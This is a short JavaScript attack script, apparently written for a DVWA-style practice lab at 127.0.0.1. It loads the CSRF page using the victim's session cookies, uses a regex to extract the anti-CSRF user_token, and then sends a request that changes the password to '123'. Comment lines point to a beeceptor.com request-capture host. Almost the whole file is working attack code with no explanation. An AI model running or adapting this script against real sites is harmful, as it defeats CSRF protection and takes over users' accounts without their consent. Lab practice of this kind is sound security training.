// https://beeceptor.com/
// http://chacha.free.beeceptor.com

var url = "http://127.0.0.1/vulnerabilities/csrf/";

request = new XMLHttpRequest();
request.withCredentials = true;

request.onreadystatechange = () => {

    if (request.readyState === request.DONE && request.status === 200){

        var response = request.responseText;
        var user_token = /[a-f0-9]{32}/g.exec(response)[0];
        var newpasswd = "123";
        var payload = "http://127.0.0.1/vulnerabilities/csrf/?password_new=" + newpasswd + "&password_conf=" + newpasswd + "&Change=Change&user_token=" + user_token;
        var second_request = new XMLHttpRequest();
        second_request.open("GET", payload);
        second_request.send();
    };
};

request.open("GET", url);
request.send();